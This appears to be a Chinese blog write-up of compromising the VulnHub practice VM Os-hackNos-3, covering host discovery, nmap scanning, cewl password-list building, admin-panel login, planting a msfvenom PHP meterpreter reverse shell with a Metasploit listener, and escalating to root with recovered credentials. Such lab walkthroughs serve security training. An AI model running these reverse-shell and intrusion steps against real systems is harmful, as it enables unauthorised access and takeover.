# vulnhub之Os-hackNos-3的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650746676&idx=1&sn=93e26945ae52f3ba679c3d078b537312&chksm=87148e34b06307229d958e45b532415a663cb834648f7f893de2e44ab36937763a9961e7df9e&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650746676&idx=1&sn=93e26945ae52f3ba679c3d078b537312&chksm=87148e34b06307229d958e45b532415a663cb834648f7f893de2e44ab36937763a9961e7df9e&scene=27#wechat_redirect)

好久没做攻击实践了，今天看了一下，手里还攒着6个vulnhub的镜像，算了一下，整好春节前把它们都实践完，今天实践的是Os-hackNos-3，

用workstation导入成功，但是扫描不出来地址，换成virtualbox，

sudo netdiscover -r 192.168.56.0/24，

![](../Images/7b410beeeb65ca20eaa08d03d88897e0.png)

接着做端口扫描，sudo nmap -sS -sV -T5 -A -p- 192.168.56.104，

![](../Images/3b9e15fb0cf239d20dd67e1ec37f8400.png)

发现有http服务，名字叫WebSec，猜一个url，

http://192.168.56.104/websec/，下面发现个账户，

![](../Images/139a5db9658336d6978d0736f8b8312f.png)

从网页内容里爬密码，

sudo cewl http://192.168.56.104/websec/ > passwd.txt，

![](../Images/b24163c445bdbf9783eb7a45c763d924.png)

从头开始试，到contact@hacknos.com/Securityx时成功，

再猜一个url，http://192.168.56.104/websec/admin，登录成功，

![](../Images/c3479041c524e4ff9928293b599f16cf.png)

找到一个能放反弹shell的地方，

![](../Images/2928107edb9f54bec161a2fc298e0a33.png)

在kali攻击机上生成反弹shell代码，

sudo msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.56.106 LPORT=4444 R > shell.php，

![](../Images/24fff499ac314fa94fb4b31b5800e17e.png)

把代码粘到页面上，保存提交，

![](../Images/f633196886f6c3501c35436c48478782.png)

在kali攻击机上开个反弹shell的监听，

msfconsole  
use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set LHOST 192.168.56.106  
set LPORT 4444  
run

在页面上再次点击保存，反弹shell就过来了，不是root，需要提权，

![](../Images/4add6cec9a1bb57a0034a298c15f1506.png)

先转成交互式shell，

python -c 'import pty; pty.spawn("/bin/bash")'，

发现个blackdevil账户，又发现可能是密码的加密数据，

![](../Images/35d9ce678551b3e00f870aeda6f9a825.png)

去https://www.spammimic.com/spreadsheet.php?action=decode上解密，得到blackdevil的密码，Security@x@，

![](../Images/805bb5586da8f269083829bf66a2e77b.png)

切换到blackdevil，发现能再直接切到root，搞定，

![](../Images/fbd1301d83f270a10b982c50a4ea82da.png)
